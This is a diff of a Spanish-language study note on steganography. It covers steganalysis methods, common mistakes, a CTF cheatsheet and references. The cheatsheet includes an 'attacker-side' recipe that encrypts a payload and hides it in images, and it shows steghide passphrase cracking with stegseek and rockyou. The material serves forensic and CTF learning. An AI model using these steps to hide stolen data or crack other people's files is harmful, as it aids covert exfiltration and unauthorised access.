-- [zsteg GitHub](https://github.com/zed-0xff/zsteg)
-- [binwalk docs](https://github.com/ReFirmLabs/binwalk)
+- **Visual**: bit-planes con stegsolve, diferencia cover/stego (`convert a.png b.png -compose difference -composite diff.png`).
+- **Estadístico**: χ² (uniformidad par/impar), RS analysis, sample-pair analysis, entropía por bloques.
+- **Estructural**: `pngcheck` (chunks, CRC), segmentos `APPn`/`COM` anómalos, datos tras EOI.
+- **Por firma**: `steghide info`, `stegdetect`, `stegspy`.
+- **ML**: SRNet/Xu-Net (~95% en JPEG con datasets BOSSBase/ALASKA2), costoso de operar.
 
-### Papers / Artículos Técnicos
-- *"Steganography in Digital Images"* - Fridrich et al.
-- *"Detecting LSB Steganography in Color Images"* - Ker (2005)
-- *"Steganalysis of JPEG Images"* - Pevny et al. (2010)
+## 10. Errores comunes
 
-### Practice / CTF
-- [Steganography challenges - OverTheWire](https://overthewire.org/wargames/)
-- [Stego challenges - HackTheBox](https://www.hackthebox.com/)
-- [CryptoHack - Steganography](https://cryptohack.org/)
+1. **Usar estego en JPEG con LSB planilla**: la compresión lossy elimina la LSB en la siguiente guarda/recompresión. LSB ⇒ PNG/BMP/WAV; JPEG ⇒ steghide/F5/outguess.
+2. **Asumir que `steghide` acepta PNG**: no; formatos soportados: JPEG, BMP, WAV, AU. `steghide info x.png` → *"unsupported format"*.
+3. **Omitir el cifrado** y confiar solo en la ocultación: estegoanálisis + extracción = payload en claro.
+4. **Payload mayor que la capacidad**: steghide falla con *"cover file too small"*; los scripts LSB silenciosamente **truncan** el mensaje (agrega un delimitador NUL y verifica la extracción).
+5. **Reutilizar covers publicadas**: análisis diferencial con la cover original = extracción trivial.
+6. **Dejar la passphrase en el historial** (`-p 'xxx'`): usar `-p "$VAR"` con variable de entorno o modo interactivo.
+7. **Confundir ocultación con integridad**: sin checksum o con `-N`, la corrupción no avisa; verificar con `file`/`strings` siempre.
+8. **Buscar solo `strings`**: muchos payloads son binarios (ZIP/ELF); `strings` no muestra cabeceras ZIP dentro de ruido.
 
-### Wordlists para stegseek
+## 11. Cheatsheet
+
 ```bash
-# RockYou (clásica)
-/usr/share/wordlists/rockyou.txt.gz
+# ── Identificación ──
+file IMG; exiftool IMG; strings -n 6 IMG | grep -iE 'flag|pass|key'
+binwalk -e IMG; pngcheck -v IMG.png          # PNG
 
-# SecLists (Daniel Miessler)
-git clone https://github.com/danielmiessler/SecLists.git
-# SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
+# ── Embed (lado atacante) ──
+openssl enc -aes-256-cbc -salt -pbkdf2 -in payload.tar.gz -out payload.enc
+steghide embed -cf foto.jpg -ef payload.enc -p "$PASS" -z 9      # JPEG/BMP/WAV/AU
+zsteg -E "payload.txt" cover.png stego.png                        # PNG LSB
 
-# Generar custom
-crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 > custom.txt
+# ── Extract (lado CTF/forense) ──
+zsteg -a img.png                                  # análisis LSB completo
+zsteg -E "b1,rgb,lsb,xy" img.png > out.bin        # extracción dirigida
+steghide info img.jpg                             # ¿steghide?
+stegseek --crack img.jpg ~/wordlists/rockyou.txt  # passphrase
+steghide extract -sf img.jpg -xf out.bin -p "$PASS"
+
+# ── Detección ──
+stegdetect sospechoso.jpg; ent sospechoso.jpg
 ```
 
----
+**Checklist de CTF**: `file` → `exiftool` → `strings` → `binwalk` → `zsteg` (PNG/BMP) → `steghide info` (JPG/BMP/WAV) → `stegseek` → stegsolve visual → χ²/estego → extraer y repetir recursivamente.
 
-## 10. Checklist Rápida (Cheatsheet)
+## 12. Referencias
 
-```
-[ ] 1. Identificar formato archivo (file, exiftool, binwalk)
-[ ] 2. Buscar strings visibles (strings, grep)
-[ ] 3. Analizar metadata (exiftool, pngcheck)
-[ ] 4. Probar zsteg (PNG/BMP) - LSB automático
-[ ] 5. Probar steghide info (JPEG/BMP/WAV)
-[ ] 6. Si steghide + passphrase → stegseek + wordlist
-[ ] 7. Binwalk -e (archivos embebidos)
-[ ] 8. Análisis visual bit-planes (stegsolve/stegonline)
-[ ] 9. Estegoanálisis estadístico (stegdetect, chi-square)
-[ ] 10. Documentar hallazgos y herramienta exitosa
-```
+- Steghide (documentación oficial): <http://steghide.sourceforge.net/documentation/>
+- Stegseek (repo): <https://github.com/RickdeJager/stegseek>
+- zsteg (repo): <https://github.com/zed-0xff/zsteg>
+- Binwalk: <https://github.com/ReFirmLabs/binwalk>
+- Fridrich, J. et al. — *Steganalysis of LSB Encoding in Color Images* (2001)
+- Ker, A. — *Steganalysis of LSB Matching in Grayscale Images* (2005)
+- Pevný, T. et al. — *Steganalysis by Subtractive Pixel Adjacency Matrix* (2010)
+- CTF practice: <https://cryptohack.org/> · <https://www.hackthebox.com/>
+- Wordlists: `/usr/share/wordlists/rockyou.txt.gz` · <https://github.com/danielmiessler/SecLists>
 
----
+## Relacionadas
 
-## 11. Estructura de Carpeta Sugerida para tus Notas
-
-```
-03 - Ciberseguridad y Pentesting/
-├── Esteganografía/
-│   ├── Esteganografía - Conceptos, Herramientas y Práctica.md  ← ESTA NOTA
-│   ├── Stegseek - Guía Rápida.md
-│   ├── Steghide - Uso Avanzado.md
-│   ├── Zsteg - Análisis LSB PNG.md
-│   ├── Estegoanálisis - Detección y ContraMedidas.md
-│   └── Casos Prácticos CTF/
-│       ├── LSB Basico.png
-│       ├── JPEG Steghide.jpg
-│       └── Polyglot JPEG-ZIP.jpg
-```
-
----
-
-> **Nota final**: La esteganografía moderna en entornos reales (malware, APT, exfiltración) suele combinarse con **covert channels** (DNS, HTTP headers, timing, ICMP) y **domain fronting**. Esta nota cubre el vector "archivo estático"; para canales de red ver `Covert Channels` (pendiente de nota propia).
-
----
-
-*Creado: $(date '+%Y-%m-%d') | Actualizado: $(date '+%Y-%m-%d') | Etiquetas: #esteganografia #forense #ctf #stegseek #steghide #zsteg #lsb #exfiltracion*
+- [[Estegoanálisis - Detección y ContraMedidas]] — teoría de detección (χ², RS, visual) y contramedidas
+- [[Steghide - Uso Avanzado]] — flags completos, capacidad, passphrase modes
+- [[Stegseek - Guía Rápida]] — cracking de passphrases steghide con wordlists
+- [[Zsteg - Análisis LSB PNG]] — extracción LSB en PNG/BMP y cadenas CTF
+- [[Wireshark y Tshark]] — canales encubiertos y análisis de tráfico
+- [[GHex Editor Hexadecimal]] — inspección hex para polyglots y appends
